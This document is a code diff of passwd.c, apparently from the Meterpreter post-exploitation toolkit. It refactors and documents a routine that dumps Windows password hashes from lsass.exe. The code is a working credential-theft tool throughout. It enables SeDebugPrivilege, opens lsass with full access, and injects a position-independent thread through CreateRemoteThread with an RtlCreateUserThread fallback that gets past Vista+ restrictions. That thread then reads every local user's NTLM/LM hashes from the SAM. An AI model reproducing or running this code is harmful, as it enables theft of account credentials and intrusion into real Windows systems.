@@ -1,3 +1,7 @@
+/*!
+ * @file passwd.c
+ * @brief Functionality for dumping password hashes from lsass.exe.
+ */
 #include "precomp.h"
 #include <stdio.h>
 #include <windows.h>
@@ -8,22 +12,39 @@
 #include <stdlib.h>
 #include <malloc.h>
 
-/* define the type of information to retrieve from the SAM */
+/*! @brief Define the type of information to retrieve from the SAM. */
 #define SAM_USER_INFO_PASSWORD_OWFS 0x12
 
-/* define types for samsrv functions */
-typedef struct _SAM_DOMAIN_USER {
+/*!
+ * @brief Name of the cross-session event name used to sync reads between threads.
+ * @remark It is very important that the event is prefixed with "Global\" otherwise it will
+ *         not be shared across processes that are in different sessions.
+ */
+#define READ_SYNC_EVENT_NAME "Global\\SAM"
+/*!
+ * @brief Name of the cross-session event name used to sync resource deallocation between threads.
+ * @remark It is very important that the event is prefixed with "Global\" otherwise it will
+ *         not be shared across processes that are in different sessions.
+ */
+#define FREE_SYNC_EVENT_NAME "Global\\FREE"
+
+/*! @brief Struct that represents a SAM user in Windows. */
+typedef struct _SAM_DOMAIN_USER
+{
 	DWORD				dwUserId;
 	LSA_UNICODE_STRING  wszUsername;
 } SAM_DOMAIN_USER;
 
-typedef struct _SAM_DOMAIN_USER_ENUMERATION {
+/*! @brief Struct that contains SAM user enumeration context. */
+typedef struct _SAM_DOMAIN_USER_ENUMERATION
+{
 	DWORD               dwDomainUserCount;
 	SAM_DOMAIN_USER     *pSamDomainUser;
 } SAM_DOMAIN_USER_ENUMERATION;
 
-/* define the type for passing data */
-typedef struct _USERNAMEHASH {
+/*! @brief DTO-style object for passing data between Meterpreter and lsass. */
+typedef struct _USERNAMEHASH
+{
 	char	*Username;
 	DWORD	Length;
 	DWORD	RID;
@@ -39,9 +60,9 @@ typedef BOOL	(WINAPI *SetEventType)(HANDLE);
 typedef BOOL	(WINAPI *CloseHandleType)(HANDLE);
 typedef DWORD	(WINAPI *WaitForSingleObjectType)(HANDLE, DWORD);
 
-/* define the context/argument structure */
-typedef struct {
-
+/*! Container for context that is given to the remote thread executed in lsass.exe. */
+typedef struct
+{
 	/* kernel32 function pointers */
 	LoadLibraryType			LoadLibrary;
 	GetProcAddressType		GetProcAddress;
@@ -80,8 +101,8 @@ typedef struct {
 	char wcstombs[9];
 
 	/* kernel sync object strings */
-	char ReadSyncEvent[4];
-	char FreeSyncEvent[5];
+	char ReadSyncEvent[11];
+	char FreeSyncEvent[12];
 
 	/* maximum wait time for sync */
 	DWORD dwMillisecondsToWait;
@@ -117,21 +138,97 @@ typedef void *(*MemcpyType)(void *, const void *, size_t);
 /* define types for ntdll */
 typedef size_t (*WcstombsType)(char *, const wchar_t *, size_t);
 
+/*! @brief Container structure for a client identifer used when creating remote threads with RtlCreateUserThread. */
+typedef struct _MIMI_CLIENT_ID {
+	PVOID UniqueProcess;
+	PVOID UniqueThread;
+} CLIENTID;
 
+/*! @brief Function pointer type for the RtlCreateUserThread function in ntdll.dll */
+typedef NTSTATUS (WINAPI * PRtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, char, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, CLIENTID*);
+/*! @brief Reference to the loaded RtlCreateUserThread function pointer. */
+static PRtlCreateUserThread pRtlCreateUserThread = NULL;
+/*! @brief Indication of whether an attempt to locate the pRtlCreateUserThread pointer has been made. */
+static BOOL pRtlCreateUserThreadAttempted = FALSE;
 
-char *StringCombine(char *string1, char *string2) {
+/*!
+ * @brief Helper function for creating a remote thread in a privileged process.
+ * @param hProcess Handle to the target processj.
+ * @param pvStartAddress Pointer to the function entry point that has been loaded into the target.
+ * @param pvStartParam Pointer to the parameter to pass to the thread function.
+ * @return Handle to the new thread.
+ * @retval NULL Indicates an error, which can be retrieved with \c GetLastError().
+ * @remark This function has been put in place to wrap up the handling of creating remote threads
+ *         in privileged processes across all operating systems. In Windows XP and earlier, the
+ *         \c CreateRemoteThread() function was sufficient to handle this case, however this changed
+ *         in Vista and has been that way since. For Vista onwards, the use of the hidden API function
+ *         \c RtlCreateUserThread() is required. This function attempts to use \c CreateRemoteThread()
+ *         first and if that fails it will fall back to \c RtlCreateUserThread(). This means that the
+ *         existing behaviour is kept for when running on XP and earlier, or when the user is already
+ *         running within a privileged process.
+ */
+HANDLE create_remote_thread(HANDLE hProcess, LPVOID pvStartAddress, LPVOID pvStartParam)
+{
+	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pvStartAddress, pvStartParam, 0, NULL);
+
+	// ERROR_NOT_ENOUGH_MEMORY is returned when the function fails due to insufficient privs
+	// on Vista and later.
+	if (GetLastError() == ERROR_NOT_ENOUGH_MEMORY)
+	{
+		dprintf("[PASSWD] CreateRemoteThread seems to lack permissions, trying alternative options");
+		hThread = NULL;
+
+		// Only attempt to load the function pointer if we haven't attempted it already.
+		if (!pRtlCreateUserThreadAttempted)
+		{
+			if (pRtlCreateUserThread == NULL)
+			{
+				pRtlCreateUserThread = (PRtlCreateUserThread)GetProcAddress(GetModuleHandleA("ntdll"), "RtlCreateUserThread");
+				if (pRtlCreateUserThread)
+				{
+					dprintf("[PASSWD] RtlCreateUserThread found at %p, using for backup remote thread creation", pRtlCreateUserThread);
+				}
+			}
+			pRtlCreateUserThreadAttempted = TRUE;
+		}
+
+		// if at this point we don't have a valid pointer, it means that we don't have this function available
+		// on the current OS
+		if (pRtlCreateUserThread)
+		{
+			dprintf("[PASSWD] Attempting thread creation with RtlCreateUserThread");
+			SetLastError(pRtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, (PTHREAD_START_ROUTINE)pvStartAddress, pvStartParam, &hThread, NULL));
+		}
+		else
+		{
+			// restore the previous error so that it looks like we haven't done anything else
+			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+		}
+	}
+
+	return hThread;
+}
+
+char *string_combine(char *string1, char *string2)
+{
 	size_t s1len, s2len;
 
-	if (string2 == NULL) { // nothing to append
+	if (string2 == NULL)
+	{
+		// nothing to append
 		return string1;
 	}
 
 	// TODO: what do we want to do if memory allocation fails?
 	s2len = strlen(string2);
-	if (string1 == NULL) { // create a new string
+	if (string1 == NULL)
+	{
+		// create a new string
 		string1 = (char *)malloc(s2len + 1);
 		strncpy_s(string1, s2len + 1, string2, s2len + 1);
-	} else {			   // append data to the string
+	}
+	else
+	{			   // append data to the string
 		s1len = strlen(string1);
 		string1 = (char *)realloc(string1, s1len + s2len + 1);
 		strncat_s(string1, s1len + s2len + 1, string2, s2len + 1);
@@ -141,7 +238,13 @@ char *StringCombine(char *string1, char *string2) {
 }
 
 /* retrieve a handle to lsass.exe */
-HANDLE GetLsassHandle() {
+/*!
+ * @brief Locate lsass.exe and get a handle to the process.
+ * @returns A handle to the lsass process, if found.
+ * @retval NULL Indicates that the lsass process couldn't be found.
+ */
+HANDLE get_lsass_handle()
+{
 
 	DWORD	dwProcessList[1024];
 	DWORD	dwProcessListSize;
@@ -150,19 +253,24 @@ HANDLE GetLsassHandle() {
 	DWORD	dwCount;
 
 	/* enumerate all pids on the system */
-	if (EnumProcesses(dwProcessList, sizeof(dwProcessList), &dwProcessListSize)) {
+	if (EnumProcesses(dwProcessList, sizeof(dwProcessList), &dwProcessListSize))
+	{
 
 		/* only look in the first 256 process ids for lsass.exe */
 		if (dwProcessListSize > sizeof(dwProcessList))
+		{
 			dwProcessListSize = sizeof(dwProcessList);
+		}
 
 		/* iterate through all pids, retrieve the executable name, and match to lsass.exe */
-		for (dwCount = 0; dwCount < dwProcessListSize; dwCount++) {
-			if (hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessList[dwCount])) {
-				if (GetModuleBaseName(hProcess, NULL, szProcessName, sizeof(szProcessName))) {
-					if (strcmp(szProcessName, "lsass.exe") == 0) {
-						return hProcess;
-					}
+		for (dwCount = 0; dwCount < dwProcessListSize; dwCount++)
+		{
+			if (hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessList[dwCount]))
+			{
+				if (GetModuleBaseName(hProcess, NULL, szProcessName, sizeof(szProcessName))
+					&& strcmp(szProcessName, "lsass.exe") == 0)
+				{
+					return hProcess;
 				}
 				CloseHandle(hProcess);
 			}
@@ -171,31 +279,61 @@ HANDLE GetLsassHandle() {
 	return 0;
 }
 
-/* set the process to have the SE_DEBUG_NAME privilige */
-int SetAccessPriv() {
-
-    HANDLE hToken;
+/*!
+ * @brief Add the SE_DEBUG_NAME privilige to the current process.
+ */
+DWORD set_access_priv()
+{
+	DWORD dwResult;
+    HANDLE hToken = NULL;
     TOKEN_PRIVILEGES priv;
 
-	/* open the current process token, retrieve the LUID for SeDebug, enable the privilege, reset the token information */
-	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
-		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid)) {
-
-			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-			priv.PrivilegeCount = 1;
- 
-			if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL)) {
-				CloseHandle(hToken);
-				return 1;
-			}
+	do
+	{
+		/* open the current process token, retrieve the LUID for SeDebug, enable the privilege, reset the token information */
+		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
+		{
+			dwResult = GetLastError();
+			dprintf("[PASSWD] Failed to open process: %u (%x)", dwResult, dwResult);
+			break;
 		}
+
+		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
+		{
+			dwResult = GetLastError();
+			dprintf("[PASSWD] Failed to lookup priv value: %u (%x)", dwResult, dwResult);
+			break;
+		}
+
+		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+		priv.PrivilegeCount = 1;
+ 
+		if (!AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL))
+		{
+			dwResult = GetLastError();
+			dprintf("[PASSWD] Failed to adjust token privs: %u (%x)", dwResult, dwResult);
+			break;
+		}
+
+		dwResult = ERROR_SUCCESS;
+	} while (0);
+
+	if (hToken != NULL)
+	{
 		CloseHandle(hToken);
 	}
-	return 0;
+
+	return dwResult;
 }
 
-int dumpSAM(FUNCTIONARGS *fargs) {
-
+/*!
+ * @brief Function that is copied to lsass and run in a separate thread to dump hashes.
+ * @param fargs Collection of arguments containing important information, handles and pointers.
+ * @remark The code in this fuction _must_ be position-independent. No direct calls to functions
+ *         are to be made.
+ */
+DWORD dump_sam(FUNCTIONARGS *fargs)
+{
 	/* variables for samsrv function pointers */
 	HANDLE hSamSrv = NULL, hSam = NULL;
 	SamIConnectType pSamIConnect;
@@ -244,7 +382,11 @@ int dumpSAM(FUNCTIONARGS *fargs) {
 
 	/* load samsrv functions */
 	hSamSrv = fargs->LoadLibrary(fargs->samsrvdll);
-	if (hSamSrv == NULL) { dwError = 1; goto cleanup; }	
+	if (hSamSrv == NULL)
+	{
+		dwError = 1;
+		goto cleanup;
+	}	
 	
 	pSamIConnect = (SamIConnectType)fargs->GetProcAddress(hSamSrv, fargs->samiconnect);
 	pSamrOpenDomain = (SamrOpenDomainType)fargs->GetProcAddress(hSamSrv, fargs->samropendomain);
@@ -254,37 +396,63 @@ int dumpSAM(FUNCTIONARGS *fargs) {
 	pSamIFree_SAMPR_USER_INFO_BUFFER = (SamIFree_SAMPR_USER_INFO_BUFFERType)fargs->GetProcAddress(hSamSrv, fargs->samifree_sampr_user_info_buffer);
 	pSamIFree_SAMPR_ENUMERATION_BUFFER = (SamIFree_SAMPR_ENUMERATION_BUFFERType)fargs->GetProcAddress(hSamSrv, fargs->samifree_sampr_enumeration_buffer);
 	pSamrCloseHandle = (SamrCloseHandleType)fargs->GetProcAddress(hSamSrv, fargs->samrclosehandle);	
+
 	if (!pSamIConnect || !pSamrOpenDomain || !pSamrEnumerateUsersInDomain || !pSamrOpenUser || !pSamrQueryInformationUser || 
-		!pSamIFree_SAMPR_USER_INFO_BUFFER || !pSamIFree_SAMPR_ENUMERATION_BUFFER || !pSamrCloseHandle) {
-			dwError = 1;
-			goto cleanup;
-		}
+		!pSamIFree_SAMPR_USER_INFO_BUFFER || !pSamIFree_SAMPR_ENUMERATION_BUFFER || !pSamrCloseHandle)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 
 	/* load advadpi32 functions */
 	hAdvApi32 = fargs->LoadLibrary(fargs->advapi32dll);
-	if (hAdvApi32 == NULL) { dwError = 1; goto cleanup; }
+	if (hAdvApi32 == NULL)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 
 	pLsaOpenPolicy = (LsaOpenPolicyType)fargs->GetProcAddress(hAdvApi32, fargs->lsaopenpolicy);
 	pLsaQueryInformationPolicy = (LsaQueryInformationPolicyType)fargs->GetProcAddress(hAdvApi32, fargs->lsaqueryinformationpolicy);
 	pLsaClose = (LsaCloseType)fargs->GetProcAddress(hAdvApi32, fargs->lsaclose);
-	if (!pLsaOpenPolicy || !pLsaQueryInformationPolicy || !pLsaClose) { dwError = 1; goto cleanup; }
+	if (!pLsaOpenPolicy || !pLsaQueryInformationPolicy || !pLsaClose)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 
 	/* load msvcrt functions */
 	hMsvcrt = fargs->LoadLibrary(fargs->msvcrtdll);
-	if (hMsvcrt == NULL) { dwError = 1; goto cleanup; }
+	if (hMsvcrt == NULL)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 
 	pMalloc = (MallocType)fargs->GetProcAddress(hMsvcrt, fargs->malloc);
 	pRealloc = (ReallocType)fargs->GetProcAddress(hMsvcrt, fargs->realloc);
 	pFree = (FreeType)fargs->GetProcAddress(hMsvcrt, fargs->free);
 	pMemcpy = (MemcpyType)fargs->GetProcAddress(hMsvcrt, fargs->memcpy);
-	if (!pMalloc || !pRealloc || !pFree || !pMemcpy) { dwError = 1; goto cleanup; }
+	if (!pMalloc || !pRealloc || !pFree || !pMemcpy)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 
 	/* load ntdll functions */
 	hNtDll = fargs->LoadLibrary(fargs->ntdlldll);
-	if (hNtDll == NULL) { dwError = 1; goto cleanup; }
+	if (hNtDll == NULL)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 	
 	pWcstombs = (WcstombsType)fargs->GetProcAddress(hNtDll, fargs->wcstombs);
-	if (!pWcstombs) { dwError = 1; goto cleanup; }
+	if (!pWcstombs)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 
 	/* initialize the LSA_OBJECT_ATTRIBUTES structure */
 	ObjectAttributes.RootDirectory = NULL;
@@ -295,39 +463,83 @@ int dumpSAM(FUNCTIONARGS *fargs) {
 	ObjectAttributes.Length = sizeof(LSA_OBJECT_ATTRIBUTES);
 
 	/* open a handle to the LSA policy */
-	if (pLsaOpenPolicy(NULL, &ObjectAttributes, POLICY_ALL_ACCESS, &hLSA) < 0) { dwError = 1; goto cleanup; }
-	if (pLsaQueryInformationPolicy(hLSA, PolicyAccountDomainInformation, &pAcctDomainInfo) < 0) { dwError = 1; goto cleanup; }
+	if (pLsaOpenPolicy(NULL, &ObjectAttributes, POLICY_ALL_ACCESS, &hLSA) < 0)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
+	if (pLsaQueryInformationPolicy(hLSA, PolicyAccountDomainInformation, &pAcctDomainInfo) < 0)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 
 	/* connect to the SAM database */
-	if (pSamIConnect(0, &hSam, MAXIMUM_ALLOWED, 1) < 0) { dwError = 1; goto cleanup; }
-	if (pSamrOpenDomain(hSam, 0xf07ff, pAcctDomainInfo->DomainSid, &hDomain) < 0) { dwError = 1; goto cleanup; }
+	if (pSamIConnect(0, &hSam, MAXIMUM_ALLOWED, 1) < 0)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
+	if (pSamrOpenDomain(hSam, 0xf07ff, pAcctDomainInfo->DomainSid, &hDomain) < 0)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 
 	/* enumerate all users and store username, rid, and hashes */
-	do {
+	do
+	{
 		status = pSamrEnumerateUsersInDomain(hDomain, &hEnumerationHandle, 0, &pEnumeratedUsers, 0xFFFF, &dwNumberOfUsers);
-		if (status < 0) { break; }	// error
+		if (status < 0)
+		{
+			break;
+		}	// error
 									// 0x0 = no more, 0x105 = more users
-		if (!dwNumberOfUsers) { break; }	// exit if no users remain
+		if (!dwNumberOfUsers)
+		{
+			break;
+		}	// exit if no users remain
 
-		if (fargs->dwDataSize == 0) {	// first allocation
+		if (fargs->dwDataSize == 0)
+		{	// first allocation
 			fargs->dwDataSize = dwNumberOfUsers * sizeof(USERNAMEHASH);
 			fargs->pUsernameHashData = pMalloc(fargs->dwDataSize);
-		} else {						// subsequent allocations
+		}
+		else
+		{						// subsequent allocations
 			fargs->dwDataSize += dwNumberOfUsers * sizeof(USERNAMEHASH);
 			fargs->pUsernameHashData = pRealloc(fargs->pUsernameHashData, fargs->dwDataSize);
 		}
-		if (fargs->pUsernameHashData == NULL) { dwError = 1; goto cleanup; }
+		if (fargs->pUsernameHashData == NULL)
+		{
+			dwError = 1;
+			goto cleanup;
+		}
 
-		for (dwCurrentUser = 0; dwCurrentUser < dwNumberOfUsers; dwCurrentUser++) {
+		for (dwCurrentUser = 0; dwCurrentUser < dwNumberOfUsers; dwCurrentUser++)
+		{
 
-			if (pSamrOpenUser(hDomain, MAXIMUM_ALLOWED, pEnumeratedUsers->pSamDomainUser[dwCurrentUser].dwUserId, &hUser) < 0) { dwError = 1; goto cleanup; }
-			if (pSamrQueryInformationUser(hUser, SAM_USER_INFO_PASSWORD_OWFS, &pvUserInfo) < 0) { dwError = 1; goto cleanup; }
+			if (pSamrOpenUser(hDomain, MAXIMUM_ALLOWED, pEnumeratedUsers->pSamDomainUser[dwCurrentUser].dwUserId, &hUser) < 0)
+			{
+				dwError = 1;
+				goto cleanup;
+			}
+			if (pSamrQueryInformationUser(hUser, SAM_USER_INFO_PASSWORD_OWFS, &pvUserInfo) < 0)
+			{
+				dwError = 1;
+				goto cleanup;
+			}
 
 			/* allocate space for another username */
 			dwUsernameLength = (pEnumeratedUsers->pSamDomainUser[dwCurrentUser].wszUsername.Length / 2);
 			(fargs->pUsernameHashData)[dwStorageIndex].Username = (char *)pMalloc(dwUsernameLength + 1);
-			if ((fargs->pUsernameHashData)[dwStorageIndex].Username == NULL) { dwError = 1; goto cleanup; } 
-			for ( i=0; i < (dwUsernameLength + 1); i++ ) {
+			if ((fargs->pUsernameHashData)[dwStorageIndex].Username == NULL)
+			{
+				dwError = 1;
+				goto cleanup;
+			} 
+			for ( i=0; i < (dwUsernameLength + 1); i++ )
+			{
 				(fargs->pUsernameHashData)[dwStorageIndex].Username[i] = 0;
 			}
 			
@@ -354,18 +566,35 @@ int dumpSAM(FUNCTIONARGS *fargs) {
 
 	/* set the event to signify that the data is ready */
 	hReadLock = fargs->OpenEvent(EVENT_MODIFY_STATE, FALSE, fargs->ReadSyncEvent);
-	if (hReadLock == NULL) { dwError = 1; goto cleanup; }
-	if (fargs->SetEvent(hReadLock) == 0) { dwError = 1; goto cleanup; }
+	if (hReadLock == NULL)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
+	if (fargs->SetEvent(hReadLock) == 0)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 	
 	/* wait for the copying to finish before freeing all the allocated memory */
 	hFreeLock = fargs->OpenEvent(EVENT_ALL_ACCESS, FALSE, fargs->FreeSyncEvent);
-	if (hFreeLock == NULL) { dwError = 1; goto cleanup; }
-	if (fargs->WaitForSingleObject(hFreeLock, fargs->dwMillisecondsToWait) != WAIT_OBJECT_0) { dwError = 1; goto cleanup; }
+	if (hFreeLock == NULL)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
+	if (fargs->WaitForSingleObject(hFreeLock, fargs->dwMillisecondsToWait) != WAIT_OBJECT_0)
+	{
+		dwError = 1;
+		goto cleanup;
+	}
 
 cleanup: 
 
 	/* free all the allocated memory */
-	for (dwCurrentUser = 0; dwCurrentUser < dwStorageIndex; dwCurrentUser++) {
+	for (dwCurrentUser = 0; dwCurrentUser < dwStorageIndex; dwCurrentUser++)
+	{
 		pFree((fargs->pUsernameHashData)[dwCurrentUser].Username);
 	}
 	pFree(fargs->pUsernameHashData);
@@ -376,10 +605,21 @@ cleanup:
 	pLsaClose(hLSA);
 
 	/* free library handles */
-	if (hSamSrv) { fargs->FreeLibrary(hSamSrv);	}
-	if (hAdvApi32) { fargs->FreeLibrary(hAdvApi32); }
-	if (hMsvcrt) { fargs->FreeLibrary(hMsvcrt); }
-	if (hNtDll) { fargs->FreeLibrary(hNtDll); }
+	if (hSamSrv)
+	{
+		fargs->FreeLibrary(hSamSrv);	}
+	if (hAdvApi32)
+	{
+		fargs->FreeLibrary(hAdvApi32);
+	}
+	if (hMsvcrt)
+	{
+		fargs->FreeLibrary(hMsvcrt);
+	}
+	if (hNtDll)
+	{
+		fargs->FreeLibrary(hNtDll);
+	}
 
 	/* signal that the memory deallocation is complete */
 	fargs->SetEvent(hReadLock);
@@ -393,90 +633,107 @@ cleanup:
 }
 
 #ifdef _WIN64
-#define sizer setArgs
+#define sizer setup_dump_sam_arguments
 #else
 void sizer() { __asm { ret } }
 #endif
 
-/* initialize the context structure - returns 0 on success, return 1 on error */
-int setArgs(FUNCTIONARGS *fargs, DWORD dwMillisecondsToWait) {
-
+/*!
+ * @brief Initialize the context structure that is used for retaining context in the remote thread.
+ * @returns Indcation of success or failure.
+ */
+DWORD setup_dump_sam_arguments(FUNCTIONARGS *fargs, DWORD dwMillisecondsToWait)
+{
+	DWORD dwResult;
 	HMODULE hLibrary = NULL;
 
-	/* set loadlibrary and getprocaddress function addresses */
-	hLibrary = LoadLibrary("kernel32");
-	if (hLibrary == NULL) { return 1; }
+	do
+	{
+		/* set loadlibrary and getprocaddress function addresses */
+		hLibrary = LoadLibrary("kernel32");
+		if (hLibrary == NULL)
+		{
+			BREAK_ON_ERROR("[PASSWD] Unable to get kernel32 handle");
+		}
 
-	fargs->LoadLibrary = (LoadLibraryType)GetProcAddress(hLibrary, "LoadLibraryA");
-	fargs->GetProcAddress = (GetProcAddressType)GetProcAddress(hLibrary, "GetProcAddress");
-	fargs->FreeLibrary = (FreeLibraryType)GetProcAddress(hLibrary, "FreeLibrary");
-	fargs->OpenEvent = (OpenEventType)GetProcAddress(hLibrary, "OpenEventA");
-	fargs->SetEvent = (SetEventType)GetProcAddress(hLibrary, "SetEvent");
-	fargs->CloseHandle = (CloseHandleType)GetProcAddress(hLibrary, "CloseHandle");
-	fargs->WaitForSingleObject = (WaitForSingleObjectType)GetProcAddress(hLibrary, "WaitForSingleObject");
+		fargs->LoadLibrary = (LoadLibraryType)GetProcAddress(hLibrary, "LoadLibraryA");
+		fargs->GetProcAddress = (GetProcAddressType)GetProcAddress(hLibrary, "GetProcAddress");
+		fargs->FreeLibrary = (FreeLibraryType)GetProcAddress(hLibrary, "FreeLibrary");
+		fargs->OpenEvent = (OpenEventType)GetProcAddress(hLibrary, "OpenEventA");
+		fargs->SetEvent = (SetEventType)GetProcAddress(hLibrary, "SetEvent");
+		fargs->CloseHandle = (CloseHandleType)GetProcAddress(hLibrary, "CloseHandle");
+		fargs->WaitForSingleObject = (WaitForSingleObjectType)GetProcAddress(hLibrary, "WaitForSingleObject");
 
-	if (!fargs->LoadLibrary || !fargs->GetProcAddress || !fargs->FreeLibrary || !fargs->OpenEvent || !fargs->SetEvent || !fargs->CloseHandle || !fargs->WaitForSingleObject) { 
-		CloseHandle(hLibrary);
-		return 1;
+		if (!fargs->LoadLibrary || !fargs->GetProcAddress || !fargs->FreeLibrary || !fargs->OpenEvent || !fargs->SetEvent || !fargs->CloseHandle || !fargs->WaitForSingleObject)
+		{
+			dwResult = ERROR_INVALID_PARAMETER;
+			dprintf("[PASSWD] Unable to find all required functions");
+			break;
+		}
+
+		/* initialize samsrv strings */
+		strncpy_s(fargs->samsrvdll, sizeof(fargs->samsrvdll), "samsrv.dll", sizeof(fargs->samsrvdll));
+		strncpy_s(fargs->samiconnect, sizeof(fargs->samiconnect), "SamIConnect", sizeof(fargs->samiconnect));
+		strncpy_s(fargs->samropendomain, sizeof(fargs->samropendomain), "SamrOpenDomain", sizeof(fargs->samropendomain));
+		strncpy_s(fargs->samropenuser, sizeof(fargs->samropenuser), "SamrOpenUser", sizeof(fargs->samropenuser));
+		strncpy_s(fargs->samrqueryinformationuser, sizeof(fargs->samrqueryinformationuser), "SamrQueryInformationUser", sizeof(fargs->samrqueryinformationuser));
+		strncpy_s(fargs->samrenumerateusersindomain, sizeof(fargs->samrenumerateusersindomain), "SamrEnumerateUsersInDomain", sizeof(fargs->samrenumerateusersindomain));
+		strncpy_s(fargs->samifree_sampr_user_info_buffer, sizeof(fargs->samifree_sampr_user_info_buffer), "SamIFree_SAMPR_USER_INFO_BUFFER", sizeof(fargs->samifree_sampr_user_info_buffer));
+		strncpy_s(fargs->samifree_sampr_enumeration_buffer, sizeof(fargs->samifree_sampr_enumeration_buffer), "SamIFree_SAMPR_ENUMERATION_BUFFER", sizeof(fargs->samifree_sampr_enumeration_buffer));
+		strncpy_s(fargs->samrclosehandle, sizeof(fargs->samrclosehandle), "SamrCloseHandle", sizeof(fargs->samrclosehandle));
+
+		/* initialize advapi32 strings */
+		strncpy_s(fargs->advapi32dll, sizeof(fargs->advapi32dll), "advapi32.dll", sizeof(fargs->advapi32dll));
+		strncpy_s(fargs->lsaopenpolicy, sizeof(fargs->lsaopenpolicy), "LsaOpenPolicy", sizeof(fargs->lsaopenpolicy));
+		strncpy_s(fargs->lsaqueryinformationpolicy, sizeof(fargs->lsaqueryinformationpolicy), "LsaQueryInformationPolicy", sizeof(fargs->lsaqueryinformationpolicy));
+		strncpy_s(fargs->lsaclose, sizeof(fargs->lsaclose), "LsaClose", sizeof(fargs->lsaclose));
+
+		/* initialize msvcrt strings */
+		strncpy_s(fargs->msvcrtdll, sizeof(fargs->msvcrtdll), "msvcrt.dll", sizeof(fargs->msvcrtdll));
+		strncpy_s(fargs->malloc, sizeof(fargs->malloc), "malloc", sizeof(fargs->malloc));
+		strncpy_s(fargs->realloc, sizeof(fargs->realloc), "realloc", sizeof(fargs->realloc));
+		strncpy_s(fargs->free, sizeof(fargs->free), "free", sizeof(fargs->free));
+		strncpy_s(fargs->memcpy, sizeof(fargs->memcpy), "memcpy", sizeof(fargs->memcpy));
+
+		/* initialize ntdll strings */
+		strncpy_s(fargs->ntdlldll, sizeof(fargs->ntdlldll), "ntdll.dll", sizeof(fargs->ntdlldll));
+		strncpy_s(fargs->wcstombs, sizeof(fargs->wcstombs), "wcstombs", sizeof(fargs->wcstombs));
+
+		/* initialize kernel sync objects */
+		strncpy_s(fargs->ReadSyncEvent, sizeof(fargs->ReadSyncEvent), READ_SYNC_EVENT_NAME, sizeof(fargs->ReadSyncEvent));
+		strncpy_s(fargs->FreeSyncEvent, sizeof(fargs->FreeSyncEvent), FREE_SYNC_EVENT_NAME, sizeof(fargs->FreeSyncEvent));
+
+		/* initialize wait time */
+		fargs->dwMillisecondsToWait = dwMillisecondsToWait;
+
+		/* initailize variables */
+		fargs->dwDataSize = 0;
+		fargs->pUsernameHashData = NULL;
+
+		dwResult = ERROR_SUCCESS;
+	} while (0);
+
+	if (hLibrary != NULL)
+	{
+		FreeLibrary(hLibrary);
 	}
 
-	/* initialize samsrv strings */
-	strncpy_s(fargs->samsrvdll, sizeof(fargs->samsrvdll), "samsrv.dll", sizeof(fargs->samsrvdll));
-	strncpy_s(fargs->samiconnect, sizeof(fargs->samiconnect), "SamIConnect", sizeof(fargs->samiconnect));
-	strncpy_s(fargs->samropendomain, sizeof(fargs->samropendomain), "SamrOpenDomain", sizeof(fargs->samropendomain));
-	strncpy_s(fargs->samropenuser, sizeof(fargs->samropenuser), "SamrOpenUser", sizeof(fargs->samropenuser));
-	strncpy_s(fargs->samrqueryinformationuser, sizeof(fargs->samrqueryinformationuser), "SamrQueryInformationUser", sizeof(fargs->samrqueryinformationuser));
-	strncpy_s(fargs->samrenumerateusersindomain, sizeof(fargs->samrenumerateusersindomain), "SamrEnumerateUsersInDomain", sizeof(fargs->samrenumerateusersindomain));
-	strncpy_s(fargs->samifree_sampr_user_info_buffer, sizeof(fargs->samifree_sampr_user_info_buffer), "SamIFree_SAMPR_USER_INFO_BUFFER", sizeof(fargs->samifree_sampr_user_info_buffer));
-	strncpy_s(fargs->samifree_sampr_enumeration_buffer, sizeof(fargs->samifree_sampr_enumeration_buffer), "SamIFree_SAMPR_ENUMERATION_BUFFER", sizeof(fargs->samifree_sampr_enumeration_buffer));
-	strncpy_s(fargs->samrclosehandle, sizeof(fargs->samrclosehandle), "SamrCloseHandle", sizeof(fargs->samrclosehandle));
-
-	/* initialize advapi32 strings */
-	strncpy_s(fargs->advapi32dll, sizeof(fargs->advapi32dll), "advapi32.dll", sizeof(fargs->advapi32dll));
-	strncpy_s(fargs->lsaopenpolicy, sizeof(fargs->lsaopenpolicy), "LsaOpenPolicy", sizeof(fargs->lsaopenpolicy));
-	strncpy_s(fargs->lsaqueryinformationpolicy, sizeof(fargs->lsaqueryinformationpolicy), "LsaQueryInformationPolicy", sizeof(fargs->lsaqueryinformationpolicy));
-	strncpy_s(fargs->lsaclose, sizeof(fargs->lsaclose), "LsaClose", sizeof(fargs->lsaclose));
-
-	/* initialize msvcrt strings */
-	strncpy_s(fargs->msvcrtdll, sizeof(fargs->msvcrtdll), "msvcrt.dll", sizeof(fargs->msvcrtdll));
-	strncpy_s(fargs->malloc, sizeof(fargs->malloc), "malloc", sizeof(fargs->malloc));
